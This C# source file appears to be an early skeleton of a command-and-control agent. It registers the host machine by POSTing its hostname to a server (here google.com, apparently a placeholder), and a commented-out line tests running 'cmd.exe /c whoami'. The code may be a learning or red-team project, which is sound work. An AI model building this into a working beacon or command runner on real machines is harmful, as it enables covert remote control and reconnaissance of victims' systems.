using System;
// per https://learn.microsoft.com/en-us/dotnet/csharp/tutorials/console-webapiclient
using System.Threading.Tasks;
using System.Net.Http;
using System.Runtime;

// testing running cmd
using System.Diagnostics;

namespace client
{
    public class Client
    {   
        
        // tasks enables threading for now
        static async Task Main(string[] args)
        {
            
            Communicator comm = new Communicator("google.com", 443);
            //await Communicator.GetRequest(comm.host);
            await comm.RegisterAgent();

            // test command exeuction
            // this is a bit janky
            //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
        }

        
    }

    // class to chat with server with
    public class Communicator 
    {

        // declare http client 
        private static readonly HttpClient httpclient = new HttpClient();

        public string host {get; set;}
        public int port {get; set;}
        public Uri uri {get; set;}
        public Communicator(string host, int port)
        {
            this.host = host;
            this.port = port;

            // build uri
            Uri uri = new Uri($"https://{this.host}:{this.port}");
            this.uri = uri;
        }

        public static async Task GetRequest(string url)
        {
            // debug right now, just dumps response to console
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.getasync?view=netcore-3.1
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpresponsemessage?view=netcore-3.1
            HttpResponseMessage response = await httpclient.GetAsync(url);
            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine(responseBody);
        }

        // register agent with server
        public async Task RegisterAgent()
        {
            try
            {
                // get machine hostname
                string hostname = System.Environment.MachineName;
                // build httpcontent body with hostname
                HttpContent content = new StringContent($"{{\"hostname\": \"{hostname}\"}}");

                // send to server for registration
                HttpResponseMessage response = await httpclient.PostAsync(this.uri, content);
                response.EnsureSuccessStatusCode();
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine("\nException Caught!");
                Console.WriteLine("Message :{0} ",e.Message);
            }
        }
    }

}
